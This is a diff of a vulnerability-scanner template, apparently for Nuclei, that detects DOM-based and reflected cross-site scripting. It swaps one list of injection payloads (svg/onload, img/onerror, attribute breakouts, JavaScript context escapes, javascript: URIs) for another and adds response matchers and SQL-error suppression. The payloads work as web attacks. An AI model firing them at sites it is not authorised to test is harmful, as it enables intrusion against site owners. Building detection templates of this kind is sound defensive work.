@@ -1,21 +1,30 @@
 id: xss-dom-based
-name: DOM Based XSS Detection
-version: 1.0
+name: DOM-Based Cross-Site Scripting (XSS)
+version: 2.0
 author: GochaOqradze
 severity: high
 description: >
-  Detects DOM-based cross-site scripting vulnerabilities by injecting various
-  XSS payloads through query parameters, path segments, and fragment identifiers.
-  Tests event handlers, script injection, and various encoding bypass techniques.
+  Detects DOM-based and reflected cross-site scripting by injecting
+  context-aware payloads through URL parameters. Covers HTML tag injection,
+  attribute breakout, JavaScript context escape, and event handler abuse.
+  Multi-layer matching validates reflection in executable context while
+  suppressing database error and WAF false positives.
 
 tags:
   - xss
   - dom-xss
   - injection
   - client-side
+  - owasp-top10
+
+metadata:
+  cwe: CWE-79
+  owasp: A03:2021
 
 references:
   - https://owasp.org/www-community/attacks/DOM_Based_XSS
+  - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+  - https://portswigger.net/web-security/cross-site-scripting/dom-based
 
 requests:
   - method: GET
@@ -30,39 +39,79 @@ requests:
     attack: batteringram
     payloads:
       payload:
-        - "javascript:(prompt)(1)"
-        - "'(prompt)(1)-'"
-        - '"-(prompt)(1)-"'
-        - "'}(prompt)(1);{'"
-        - '"}(prompt)(1)%0A{"'
-        - "(prompt)(1)//"
-        - "';-(prompt)(1)//"
-        - "\"';-(prompt)(1)//"
-        - "\";-(prompt)(1)//"
-        - "*/;(prompt)(1);/*"
-        - "'autofocus/onfocus=(prompt)(1)//"
-        - '"autofocus/onfocus=(prompt)(1)//'
-        - "</script><svg/onload=(prompt)()>"
-        - "<img src=1 onerror=(prompt)(1)>"
-        - '/"><svg/onload=(prompt)(1)>'
-        - '<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>'
+        # HTML tag injection
+        - '<svg/onload=alert(1)>'
+        - '<img src=x onerror=alert(1)>'
+        - '<details/open/ontoggle=alert(1)>'
+        - '</script><svg/onload=alert(1)>'
 
-    matchers-condition: or
+        # Attribute breakout (double / single quote)
+        - '" autofocus onfocus=alert(1) x="'
+        - "' autofocus onfocus=alert(1) x='"
+        - '/"><svg/onload=alert(1)>'
+
+        # JavaScript context escape
+        - "'-alert(1)-'"
+        - '"-alert(1)-"'
+        - "';alert(1)//"
+        - '";alert(1)//'
+        - "}-alert(1)-{"
+        - "*/alert(1);/*"
+
+        # Protocol handler
+        - "javascript:alert(1)"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
     matchers:
+      # Response must be HTTP 200
+      - type: status
+        status:
+          - 200
+
+      # Response must be HTML
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      # Payload reflected in executable context
       - type: word
         part: body
         words:
-          - "(prompt)(1)"
-          - "(prompt)()"
-          - "onerror=(prompt)"
-          - "onload=(prompt)"
-          - "onfocus=(prompt)"
-          - "alert(1)"
+          - "onerror=alert(1)"
+          - "onload=alert(1)"
+          - "ontoggle=alert(1)"
+          - "onfocus=alert(1)"
+          - "-alert(1)-"
+          - ";alert(1)//"
+          - ";alert(1);/*"
+          - "javascript:alert(1)"
         condition: or
 
-      - type: regex
-        regex:
-          - "<svg[^>]*onload="
-          - "<img[^>]*onerror="
-          - "<script[^>]*>"
+      # Suppress database / application error false positives
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "SQL syntax"
+          - "You have an error in your SQL"
+          - "mysql_"
+          - "MySQLSyntaxErrorException"
+          - "ORA-"
+          - "PG::SyntaxError"
+          - "Unclosed quotation mark"
+          - "sqlite3.OperationalError"
+          - "SQLSTATE["
+          - "Microsoft OLE DB"
+          - "JDBC Exception"
         condition: or
+
+    extractors:
+      - type: regex
+        name: reflected_context
+        part: body
+        regex:
+          - '.{0,40}(alert\(1\)).{0,40}'
+        group: 0
